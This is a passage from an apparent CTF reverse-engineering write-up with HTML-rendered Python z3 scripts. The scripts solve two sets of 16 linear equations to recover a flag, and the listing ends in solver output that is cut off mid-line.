x[<span class="number">0</span>] + <span class="number">130</span> * x[<span class="number">13</span>] + <span class="number">124</span> * x[<span class="number">3</span>] + <span class="number">55</span> * x[</span><br><span class="line">    <span class="number">12</span>] + <span class="number">157</span> * x[<span class="number">14</span>] + <span class="number">175</span> * x[<span class="number">5</span>] + <span class="number">140</span> * x[<span class="number">4</span>] + <span class="number">241</span> * x[<span class="number">9</span>] + <span class="number">11</span> * x[<span class="number">11</span>] + <span class="number">211</span> * x[<span class="number">2</span>] + <span class="number">121</span> * x[<span class="number">7</span>] + <span class="number">200</span> * x[<span class="number">15</span>])</span><br><span class="line">s.add(flag[<span class="number">6</span>] == <span class="number">195</span> * x[<span class="number">14</span>] + <span class="number">197</span> * x[<span class="number">13</span>] + <span class="number">218</span> * x[<span class="number">7</span>] + <span class="number">83</span> * x[<span class="number">1</span>] + <span class="number">98</span> * x[<span class="number">2</span>] + <span class="number">70</span> * x[<span class="number">10</span>] + <span class="number">229</span> * x[<span class="number">15</span>] + <span class="number">148</span> * x[</span><br><span class="line">    <span class="number">11</span>] + <span class="number">195</span> * x[<span class="number">0</span>] + <span class="number">94</span> * x[<span class="number">6</span>] + <span class="number">211</span> * x[<span class="number">12</span>] + <span class="number">220</span> * x[<span class="number">9</span>] + <span class="number">81</span> * x[<span class="number">5</span>] + <span class="number">253</span> * x[<span class="number">8</span>] + <span class="number">78</span> * x[<span class="number">4</span>] + <span class="number">4</span> * x[<span class="number">3</span>])</span><br><span class="line">s.add(flag[<span class="number">14</span>] == <span class="number">3</span> * x[<span class="number">4</span>] + <span class="number">136</span> * x[<span class="number">7</span>] + <span class="number">156</span> * x[<span class="number">3</span>] + <span class="number">189</span> * x[<span class="number">1</span>] + <span class="number">244</span> * x[<span class="number">12</span>] + <span class="number">157</span> * x[<span class="number">15</span>] + <span class="number">83</span> * x[<span class="number">9</span>] + <span class="number">6</span> * x[</span><br><span class="line">    <span class="number">0</span>] + <span class="number">113</span> * x[<span class="number">6</span>] + <span class="number">63</span> * x[<span class="number">14</span>] + <span class="number">35</span> * x[<span class="number">2</span>] + <span class="number">22</span> * x[<span class="number">8</span>] + <span class="number">26</span> * x[<span class="number">10</span>] + <span class="number">62</span> * x[<span class="number">11</span>] + <span class="number">98</span> * x[<span class="number">5</span>] + <span class="number">110</span> * x[<span class="number">13</span>])</span><br><span class="line">s.add(flag[<span class="number">4</span>] == <span class="number">96</span> * x[<span class="number">4</span>] + <span class="number">248</span> * x[<span class="number">8</span>] + <span class="number">191</span> * x[<span class="number">9</span>] + <span class="number">194</span> * x[<span class="number">2</span>] + <span class="number">154</span> * x[<span class="number">1</span>] + <span class="number">31</span> * x[<span class="number">6</span>] + <span class="number">157</span> * x[<span class="number">7</span>] + <span class="number">248</span> * x[</span><br><span class="line">    <span class="number">13</span>] + <span class="number">81</span> * x[<span class="number">15</span>] + <span class="number">56</span> * x[<span class="number">10</span>] + <span class="number">52</span> * x[<span class="number">0</span>] + <span class="number">94</span> * x[<span class="number">12</span>] + <span class="number">212</span> * x[<span class="number">5</span>] + <span class="number">83</span> * x[<span class="number">3</span>] + <span class="number">83</span> * x[<span class="number">14</span>] + <span class="number">158</span> * x[<span class="number">11</span>])</span><br><span class="line">s.add(flag[<span class="number">1</span>] == <span class="number">67</span> * x[<span class="number">4</span>] + <span class="number">220</span> * x[<span class="number">2</span>] + <span class="number">123</span> * x[<span class="number">11</span>] + <span class="number">168</span> * x[<span class="number">5</span>] + <span class="number">23</span> * x[<span class="number">12</span>] + <span class="number">148</span> * x[<span class="number">7</span>] + <span class="number">127</span> * x[<span class="number">10</span>] + <span class="number">194</span> * x[</span><br><span class="line">    <span class="number">1</span>] + <span class="number">132</span> * x[<span class="number">8</span>] + <span class="number">44</span> * x[<span class="number">0</span>] + <span class="number">60</span> * x[<span class="number">13</span>] + <span class="number">98</span> * x[<span class="number">15</span>] + <span class="number">38</span> * x[<span class="number">14</span>] + <span class="number">245</span> * x[<span class="number">9</span>] + <span class="number">159</span> * x[<span class="number">6</span>] + <span class="number">146</span> * x[<span class="number">3</span>])</span><br><span class="line">s.add(</span><br><span class="line">    flag[<span class="number">5</span>] == <span class="number">132</span> * x[<span class="number">3</span>] + <span class="number">10</span> * x[<span class="number">7</span>] + <span class="number">95</span> * x[<span class="number">0</span>] + <span class="number">83</span> * x[<span class="number">10</span>] + <span class="number">99</span> * x[<span class="number">1</span>] + <span class="number">77</span> * x[<span class="number">12</span>] + <span class="number">195</span> * x[<span class="number">2</span>] + <span class="number">47</span> * x[<span class="number">6</span>] + <span class="number">38</span> *</span><br><span class="line">    x[<span class="number">13</span>] + <span class="number">178</span> * x[<span class="number">8</span>] + <span class="number">74</span> * x[<span class="number">4</span>] + <span class="number">86</span> * x[<span class="number">11</span>] + <span class="number">208</span> * x[<span class="number">9</span>] + <span class="number">240</span> * x[<span class="number">14</span>] + <span class="number">120</span> * x[<span class="number">5</span>] + <span class="number">43</span> * x[<span class="number">15</span>])</span><br><span class="line">s.add(flag[<span class="number">9</span>] == <span class="number">172</span> * x[<span class="number">1</span>] + <span class="number">110</span> * x[<span class="number">2</span>] + <span class="number">92</span> * x[<span class="number">7</span>] + <span class="number">126</span> * x[<span class="number">15</span>] + <span class="number">91</span> * x[<span class="number">0</span>] + <span class="number">77</span> * x[<span class="number">6</span>] + <span class="number">207</span> * x[<span class="number">5</span>] + <span class="number">249</span> * x[</span><br><span class="line">    <span class="number">11</span>] + <span class="number">240</span> * x[<span class="number">12</span>] + <span class="number">129</span> * x[<span class="number">10</span>] + <span class="number">6</span> * x[<span class="number">13</span>] + <span class="number">100</span> * x[<span class="number">3</span>] + x[<span class="number">14</span>] + <span class="number">76</span> * x[<span class="number">9</span>] + <span class="number">127</span> * x[<span class="number">4</span>] + <span class="number">4</span> * x[<span class="number">8</span>])</span><br><span class="line">s.add(flag[<span class="number">10</span>] == <span class="number">46</span> * x[<span class="number">15</span>] + <span class="number">37</span> * x[<span class="number">0</span>] + <span class="number">3</span> * x[<span class="number">3</span>] + <span class="number">72</span> * x[<span class="number">6</span>] + <span class="number">116</span> * x[<span class="number">7</span>] + <span class="number">186</span> * x[<span class="number">1</span>] + <span class="number">221</span> * x[<span class="number">14</span>] + <span class="number">236</span> * x[</span><br><span class="line">    <span class="number">4</span>] + <span class="number">79</span> * x[<span class="number">2</span>] + <span class="number">175</span> * x[<span class="number">10</span>] + <span class="number">184</span> * x[<span class="number">9</span>] + <span class="number">160</span> * x[<span class="number">11</span>] + <span class="number">227</span> * x[<span class="number">12</span>] + <span class="number">99</span> * x[<span class="number">8</span>] + <span class="number">71</span> * x[<span class="number">13</span>] + <span class="number">4</span> * x[<span class="number">5</span>])</span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="number">203</span> * x[<span class="number">3</span>] + <span class="number">31</span> * x[<span class="number">0</span>] + <span class="number">11</span> * x[<span class="number">14</span>] + <span class="number">149</span> * x[<span class="number">7</span>] + <span class="number">215</span> * x[<span class="number">5</span>] + <span class="number">206</span> * x[<span class="number">1</span>] + <span class="number">245</span> * x[<span class="number">6</span>] + <span class="number">9</span> * x[</span><br><span class="line">    <span class="number">11</span>] + <span class="number">16</span> * x[<span class="number">10</span>] + <span class="number">241</span> * x[<span class="number">13</span>] + <span class="number">110</span> * x[<span class="number">8</span>] + <span class="number">175</span> * x[<span class="number">2</span>] + <span class="number">38</span> * x[<span class="number">4</span>] + <span class="number">227</span> * x[<span class="number">9</span>] + <span class="number">208</span> * x[<span class="number">12</span>] + <span class="number">8</span> * x[<span class="number">15</span>])</span><br><span class="line">s.add(flag[<span class="number">2</span>] == <span class="number">132</span> * x[<span class="number">3</span>] + <span class="number">119</span> * x[<span class="number">14</span>] + <span class="number">26</span> * x[<span class="number">8</span>] + <span class="number">24</span> * x[<span class="number">6</span>] + <span class="number">121</span> * x[<span class="number">11</span>] + <span class="number">235</span> * x[<span class="number">2</span>] + <span class="number">228</span> * x[<span class="number">12</span>] + <span class="number">34</span> * x[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">37</span> * x[<span class="number">15</span>] + <span class="number">24</span> * x[<span class="number">9</span>] + <span class="number">145</span> * x[<span class="number">13</span>] + <span class="number">199</span> * x[<span class="number">4</span>] + <span class="number">173</span> * x[<span class="number">10</span>] + <span class="number">58</span> * x[<span class="number">0</span>] + <span class="number">246</span> * x[<span class="number">7</span>] + <span class="number">199</span> * x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(s.check() == sat):</span><br><span class="line">      condition = []</span><br><span class="line">      m = s.model()</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[%d]&quot;</span>%k)</span><br><span class="line">      <span class="built_in">print</span>(m)</span><br><span class="line">      k += <span class="number">1</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            condition.append(x[i] != <span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[x[i]])))</span><br><span class="line"></span><br><span class="line">      s.add(Or(condition))</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[0]</span><br><span class="line">[x[9] = 179,x[14] = 114,x[8] = 72,x[7] = 51,x[2] = 1,x[6] = 186,x[1] = 45,x[12] = 113,</span><br><span class="line"> x[13] = 43,x[4] = 43,x[11] = 51,x[5] = 42,x[3] = 51,x[10] = 186,x[15] = 72,x[0] = 90]</span><br><span class="line">[1]</span><br><span class="line">[x[9] = 51,x[14] = 242,x[8] = 200,x[2] = 1,x[7] = 51,x[12] = 113,x[1] = 45,x[5] = 170,x[4] = 43,x[11] = 51,x[6] = 186,x[3] = 51,x[13] = 43,x[10] = 58,x[15] = 72,x[0] =  218]</span><br></pre></td></tr></table></div></figure><p>后半</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line">    <span class="number">0x27FC8</span>, <span class="number">0x29049</span>, <span class="number">0x3336C</span>, <span class="number">0x2C6A7</span>,</span><br><span class="line">    <span class="number">0x36CB0</span>, <span class="number">0x1F2BB</span>, <span class="number">0x35262</span>, <span class="number">0x2AEDF</span>,</span><br><span class="line">    <span class="number">0x2955E</span>, <span class="number">0x2EE10</span>, <span class="number">0x2B057</span>, <span class="number">0x2FDE8</span>,</span><br><span class="line">    <span class="number">0x29B92</span>, <span class="number">0x35842</span>, <span class="number">0x294D2</span>, <span class="number">0x2B984</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="number">159</span> * x[<span class="number">8</span>] + <span class="number">109</span> * x[<span class="number">12</span>] + <span class="number">14</span> * x[<span class="number">0</span>] + <span class="number">92</span> * x[<span class="number">14</span>] + <span class="number">211</span> * x[<span class="number">4</span>] + <span class="number">178</span> * x[<span class="number">7</span>] + <span class="number">57</span> * x[<span class="number">2</span>] + <span class="number">175</span> * x[</span><br><span class="line">    <span class="number">5</span>] + <span class="number">170</span> * x[<span class="number">11</span>] + <span class="number">59</span> * x[<span class="number">6</span>] + <span class="number">200</span> * x[<span class="number">9</span>] + <span class="number">5</span> * x[<span class="number">15</span>] + <span class="number">48</span> * x[<span class="number">13</span>] + <span class="number">28</span> * x[<span class="number">3</span>] + <span class="number">18</span> * x[<span class="number">10</span>] + <span class="number">228</span> * x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">6</span>] == <span class="number">173</span> * x[<span class="number">11</span>] + <span class="number">34</span> * x[<span class="number">5</span>] + <span class="number">69</span> * x[<span class="number">4</span>] + <span class="number">216</span> * x[<span class="number">14</span>] + <span class="number">225</span> * x[<span class="number">9</span>] + <span class="number">160</span> * x[<span class="number">1</span>] + <span class="number">207</span> * x[<span class="number">10</span>] + <span class="number">175</span> * x[</span><br><span class="line">    <span class="number">7</span>] + <span class="number">121</span> * x[<span class="number">0</span>] + <span class="number">122</span> * x[<span class="number">2</span>] + <span class="number">179</span> * x[<span class="number">12</span>] + <span class="number">91</span> * x[<span class="number">13</span>] + <span class="number">181</span> * x[<span class="number">8</span>] + <span class="number">93</span> * x[<span class="number">3</span>] + <span class="number">121</span> * x[<span class="number">6</span>] + <span class="number">12</span> * x[<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">8</span>] == <span class="number">215</span> * x[<span class="number">11</span>] + <span class="number">164</span> * x[<span class="number">5</span>] + <span class="number">97</span> * x[<span class="number">2</span>] + <span class="number">99</span> * x[<span class="number">3</span>] + <span class="number">188</span> * x[<span class="number">4</span>] + (x[<span class="number">9</span>] &lt;&lt; <span class="number">7</span>) + <span class="number">214</span> * x[<span class="number">6</span>] + <span class="number">106</span> * x[</span><br><span class="line">    <span class="number">8</span>] + <span class="number">169</span> * x[<span class="number">0</span>] + <span class="number">28</span> * x[<span class="number">14</span>] + <span class="number">18</span> * x[<span class="number">12</span>] + x[<span class="number">1</span>] + <span class="number">177</span> * x[<span class="number">10</span>] + <span class="number">114</span> * x[<span class="number">7</span>] + <span class="number">176</span> * x[<span class="number">15</span>] + <span class="number">25</span> * x[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">9</span>] == <span class="number">175</span> * x[<span class="number">14</span>] + <span class="number">42</span> * x[<span class="number">4</span>] + <span class="number">214</span> * x[<span class="number">12</span>] + <span class="number">43</span> * x[<span class="number">13</span>] + <span class="number">147</span> * x[<span class="number">6</span>] + <span class="number">53</span> * x[<span class="number">10</span>] + <span class="number">12</span> * x[<span class="number">1</span>] + <span class="number">213</span> * x[</span><br><span class="line">    <span class="number">7</span>] + <span class="number">241</span> * x[<span class="number">9</span>] + <span class="number">223</span> * x[<span class="number">5</span>] + <span class="number">65</span> * x[<span class="number">3</span>] + <span class="number">42</span> * x[<span class="number">15</span>] + <span class="number">131</span> * x[<span class="number">2</span>] + <span class="number">81</span> * x[<span class="number">0</span>] + <span class="number">92</span> * x[<span class="number">11</span>] + <span class="number">110</span> * x[<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">13</span>] == <span class="number">57</span> * x[<span class="number">0</span>] + <span class="number">109</span> * x[<span class="number">7</span>] + <span class="number">60</span> * x[<span class="number">2</span>] + <span class="number">228</span> * x[<span class="number">13</span>] + <span class="number">166</span> * x[<span class="number">4</span>] + <span class="number">236</span> * x[<span class="number">9</span>] + <span class="number">100</span> * x[<span class="number">6</span>] + <span class="number">179</span> * x[</span><br><span class="line">    <span class="number">11</span>] + <span class="number">20</span> * x[<span class="number">12</span>] + <span class="number">45</span> * x[<span class="number">8</span>] + <span class="number">204</span> * x[<span class="number">3</span>] + <span class="number">182</span> * x[<span class="number">14</span>] + <span class="number">84</span> * x[<span class="number">10</span>] + <span class="number">170</span> * x[<span class="number">15</span>] + <span class="number">199</span> * x[<span class="number">5</span>] + <span class="number">138</span> * x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">10</span>] == <span class="number">98</span> * x[<span class="number">11</span>] + <span class="number">122</span> * x[<span class="number">9</span>] + <span class="number">237</span> * x[<span class="number">12</span>] + <span class="number">117</span> * x[<span class="number">0</span>] + <span class="number">34</span> * x[<span class="number">3</span>] + <span class="number">168</span> * x[<span class="number">8</span>] + <span class="number">135</span> * x[<span class="number">10</span>] + <span class="number">119</span> * x[</span><br><span class="line">    <span class="number">6</span>] + <span class="number">91</span> * x[<span class="number">2</span>] + <span class="number">161</span> * x[<span class="number">15</span>] + <span class="number">152</span> * x[<span class="number">7</span>] + <span class="number">186</span> * x[<span class="number">4</span>] + <span class="number">187</span> * x[<span class="number">13</span>] + <span class="number">72</span> * x[<span class="number">14</span>] + <span class="number">36</span> * x[<span class="number">5</span>] + <span class="number">171</span> * x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">7</span>] == <span class="number">184</span> * x[<span class="number">9</span>] + <span class="number">112</span> * x[<span class="number">0</span>] + <span class="number">107</span> * x[<span class="number">11</span>] + <span class="number">170</span> * x[<span class="number">13</span>] + <span class="number">55</span> * x[<span class="number">8</span>] + <span class="number">85</span> * x[<span class="number">14</span>] + <span class="number">212</span> * x[<span class="number">10</span>] + <span class="number">173</span> * x[</span><br><span class="line">    <span class="number">15</span>] + <span class="number">166</span> * x[<span class="number">12</span>] + <span class="number">142</span> * x[<span class="number">4</span>] + <span class="number">202</span> * x[<span class="number">5</span>] + <span class="number">63</span> * x[<span class="number">2</span>] + <span class="number">30</span> * x[<span class="number">7</span>] + <span class="number">175</span> * x[<span class="number">3</span>] + <span class="number">217</span> * x[<span class="number">6</span>] + <span class="number">63</span> * x[<span class="number">1</span>])</span><br><span class="line">s.add(flag[<span class="number">15</span>] == (x[<span class="number">7</span>] &lt;&lt; <span class="number">6</span>) + <span class="number">228</span> * x[<span class="number">4</span>] + <span class="number">90</span> * x[<span class="number">11</span>] + <span class="number">85</span> * x[<span class="number">3</span>] + <span class="number">196</span> * x[<span class="number">6</span>] + <span class="number">219</span> * x[<span class="number">0</span>] + <span class="number">93</span> * x[<span class="number">14</span>] + <span class="number">183</span> * x[</span><br><span class="line">    <span class="number">15</span>] + <span class="number">156</span> * x[<span class="number">12</span>] + <span class="number">197</span> * x[<span class="number">8</span>] + <span class="number">119</span> * x[<span class="number">13</span>] + <span class="number">36</span> * x[<span class="number">10</span>] + <span class="number">205</span> * x[<span class="number">2</span>] + <span class="number">94</span> * x[<span class="number">9</span>] + <span class="number">153</span> * x[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">5</span>] == <span class="number">9</span> * x[<span class="number">4</span>] + (x[<span class="number">5</span>] &lt;&lt; <span class="number">6</span>) + <span class="number">62</span> * x[<span class="number">1</span>] + <span class="number">58</span> * x[<span class="number">7</span>] + <span class="number">100</span> * x[<span class="number">13</span>] + <span class="number">137</span> * x[<span class="number">11</span>] + <span class="number">6</span> * x[<span class="number">0</span>] + <span class="number">119</span> * x[</span><br><span class="line">    <span class="number">9</span>] + <span class="number">180</span> * x[<span class="number">6</span>] + <span class="number">228</span> * x[<span class="number">8</span>] + <span class="number">88</span> * x[<span class="number">12</span>] + <span class="number">107</span> * x[<span class="number">15</span>] + <span class="number">56</span> * x[<span class="number">14</span>] + <span class="number">207</span> * x[<span class="number">2</span>] + <span class="number">248</span> * x[<span class="number">10</span>] + <span class="number">150</span> * x[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">s.add(</span><br><span class="line">    flag[<span class="number">3</span>] == <span class="number">38</span> * x[<span class="number">7</span>] + <span class="number">194</span> * x[<span class="number">4</span>] + <span class="number">105</span> * x[<span class="number">0</span>] + <span class="number">150</span> * x[<span class="number">6</span>] + <span class="number">75</span> * x[<span class="number">1</span>] + <span class="number">89</span> * x[<span class="number">15</span>] + <span class="number">99</span> * x[<span class="number">14</span>] + <span class="number">98</span> * x[<span class="number">3</span>] + <span class="number">91</span> *</span><br><span class="line">    x[<span class="number">8</span>] + <span class="number">178</span> * x[<span class="number">12</span>] + <span class="number">117</span> * x[<span class="number">2</span>] + <span class="number">48</span> * x[<span class="number">13</span>] + <span class="number">239</span> * x[<span class="number">10</span>] + <span class="number">233</span> * x[<span class="number">11</span>] + <span class="number">63</span> * x[<span class="number">5</span>] + <span class="number">250</span> * x[<span class="number">9</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">11</span>] == <span class="number">30</span> * x[<span class="number">8</span>] + <span class="number">13</span> * x[<span class="number">5</span>] + <span class="number">206</span> * x[<span class="number">3</span>] + <span class="number">234</span> * x[<span class="number">15</span>] + <span class="number">71</span> * x[<span class="number">7</span>] + <span class="number">239</span> * x[<span class="number">12</span>] + <span class="number">141</span> * x[<span class="number">10</span>] + <span class="number">179</span> * x[</span><br><span class="line">    <span class="number">13</span>] + <span class="number">113</span> * x[<span class="number">14</span>] + <span class="number">181</span> * x[<span class="number">9</span>] + <span class="number">52</span> * x[<span class="number">6</span>] + <span class="number">74</span> * x[<span class="number">11</span>] + <span class="number">168</span> * x[<span class="number">4</span>] + <span class="number">239</span> * x[<span class="number">1</span>] + <span class="number">164</span> * x[<span class="number">0</span>] + <span class="number">179</span> * x[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">14</span>] == <span class="number">211</span> * x[<span class="number">1</span>] + <span class="number">74</span> * x[<span class="number">5</span>] + <span class="number">144</span> * x[<span class="number">8</span>] + <span class="number">234</span> * x[<span class="number">0</span>] + <span class="number">241</span> * x[<span class="number">2</span>] + <span class="number">157</span> * x[<span class="number">11</span>] + <span class="number">25</span> * x[<span class="number">15</span>] + <span class="number">6</span> * x[</span><br><span class="line">    <span class="number">10</span>] + <span class="number">243</span> * x[<span class="number">6</span>] + <span class="number">107</span> * x[<span class="number">9</span>] + <span class="number">77</span> * x[<span class="number">12</span>] + <span class="number">127</span> * x[<span class="number">4</span>] + <span class="number">67</span> * x[<span class="number">7</span>] + <span class="number">13</span> * x[<span class="number">14</span>] + <span class="number">151</span> * x[<span class="number">3</span>] + <span class="number">127</span> * x[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">2</span>] == <span class="number">209</span> * x[<span class="number">9</span>] + <span class="number">110</span> * x[<span class="number">7</span>] + <span class="number">22</span> * x[<span class="number">10</span>] + <span class="number">102</span> * x[<span class="number">11</span>] + <span class="number">187</span> * x[<span class="number">1</span>] + <span class="number">58</span> * x[<span class="number">8</span>] + <span class="number">236</span> * x[<span class="number">6</span>] + <span class="number">146</span> * x[</span><br><span class="line">    <span class="number">13</span>] + <span class="number">205</span> * x[<span class="number">15</span>] + <span class="number">63</span> * x[<span class="number">2</span>] + <span class="number">211</span> * x[<span class="number">4</span>] + <span class="number">152</span> * x[<span class="number">3</span>] + <span class="number">82</span> * x[<span class="number">14</span>] + <span class="number">14</span> * x[<span class="number">5</span>] + <span class="number">49</span> * x[<span class="number">12</span>] + <span class="number">251</span> * x[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">12</span>] == <span class="number">230</span> * x[<span class="number">0</span>] + <span class="number">27</span> * x[<span class="number">3</span>] + <span class="number">186</span> * x[<span class="number">10</span>] + <span class="number">58</span> * x[<span class="number">7</span>] + <span class="number">121</span> * x[<span class="number">1</span>] + <span class="number">59</span> * x[<span class="number">14</span>] + <span class="number">90</span> * x[<span class="number">12</span>] + <span class="number">40</span> * x[</span><br><span class="line">    <span class="number">2</span>] + <span class="number">230</span> * x[<span class="number">11</span>] + <span class="number">25</span> * x[<span class="number">6</span>] + <span class="number">198</span> * x[<span class="number">5</span>] + <span class="number">81</span> * x[<span class="number">4</span>] + <span class="number">71</span> * x[<span class="number">13</span>] + <span class="number">180</span> * x[<span class="number">8</span>] + <span class="number">149</span> * x[<span class="number">9</span>] + <span class="number">73</span> * x[<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">4</span>] == <span class="number">188</span> * x[<span class="number">5</span>] + <span class="number">80</span> * x[<span class="number">1</span>] + <span class="number">221</span> * x[<span class="number">6</span>] + (x[<span class="number">12</span>] &lt;&lt; <span class="number">6</span>) + <span class="number">230</span> * x[<span class="number">3</span>] + <span class="number">123</span> * x[<span class="number">8</span>] + <span class="number">124</span> * x[<span class="number">11</span>] + <span class="number">253</span> * x[</span><br><span class="line">    <span class="number">0</span>] + <span class="number">202</span> * x[<span class="number">10</span>] + <span class="number">63</span> * x[<span class="number">2</span>] + <span class="number">40</span> * x[<span class="number">7</span>] + <span class="number">109</span> * x[<span class="number">9</span>] + <span class="number">195</span> * x[<span class="number">15</span>] + <span class="number">199</span> * x[<span class="number">13</span>] + <span class="number">82</span> * x[<span class="number">4</span>] + <span class="number">225</span> * x[<span class="number">14</span>])</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">1</span>] == <span class="number">236</span> * x[<span class="number">15</span>] + <span class="number">44</span> * x[<span class="number">14</span>] + <span class="number">214</span> * x[<span class="number">13</span>] + <span class="number">52</span> * x[<span class="number">8</span>] + <span class="number">37</span> * x[<span class="number">6</span>] + <span class="number">101</span> * x[<span class="number">9</span>] + <span class="number">244</span> * x[<span class="number">10</span>] + <span class="number">238</span> * x[</span><br><span class="line">    <span class="number">11</span>] + <span class="number">109</span> * x[<span class="number">0</span>] + <span class="number">188</span> * x[<span class="number">1</span>] + <span class="number">20</span> * x[<span class="number">3</span>] + <span class="number">87</span> * x[<span class="number">7</span>] + <span class="number">93</span> * x[<span class="number">4</span>] + <span class="number">158</span> * x[<span class="number">5</span>] + <span class="number">105</span> * x[<span class="number">12</span>] + <span class="number">3</span> * x[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (s.check() == sat):</span><br><span class="line">    condition = []</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[%d]&quot;</span> % k)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        condition.append(x[i] != <span class="built_in">int</span>(<span class="string">&quot;%s&quot;</span> % (m[x[i]])))</span><br><span class="line"></span><br><span class="line">    s.add(Or(condition))</span><br></pre></td></tr></table></div></figure><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>]                                                                                   </span><br><span class="line">[x[<span class="number">9</span>] = <span class="number">58</span>,x[<span class="number">14</span>] = <span class="number">145</span>,x[<span class="number">8</span>] = <span class="number">153</span>,x[<span class="number">7</span>] = <span class="number">186</span>,x[<span class="number">2</span>] = <span class="number">51</span>,x[<span class="number">6</span>] = <span class="number">106</span>,x[<span class="number">11</span>] = <span class="number">50</span>,x[<span class="number">5</span>] = <span class="number">115</span>,x[<span class="number">4</span>] = <span class="number">71</span>,x[<span class="number">13</span>] = <span class="number">188</span>,x[<span class="number">12</span>] = <span class="number">75</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">1</span>] = <span class="number">170</span>,x[<span class="number">10</span>] = <span class="number">170</span>,x[<span class="number">15</span>] = <span class="number">115</span>,x[<span class="number">0</span>] = <span class="number">58</span>]</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]                                                                                    </span><br><span class="line">[x[<span class="number">9</span>] = <span class="number">186</span>,x[<span class="number">14</span>] = <span class="number">209</span>,x[<span class="number">8</span>] = <span class="number">25</span>,x[<span class="number">2</span>] = <span class="number">179</span>,x[<span class="number">7</span>] = <span class="number">58</span>,x[<span class="number">12</span>] = <span class="number">11</span>,x[<span class="number">1</span>] = <span class="number">170</span>,x[<span class="number">5</span>] = <span class="number">51</span>,x[<span class="number">4</span>] = <span class="number">199</span>,x[<span class="number">11</span>] = <span class="number">114</span>,x[<span class="number">6</span>] = <span class="number">42</span>,x[<span class="number">3</span>] = <span class="number">45</span>,x[<span class="number">13</span>] = <span 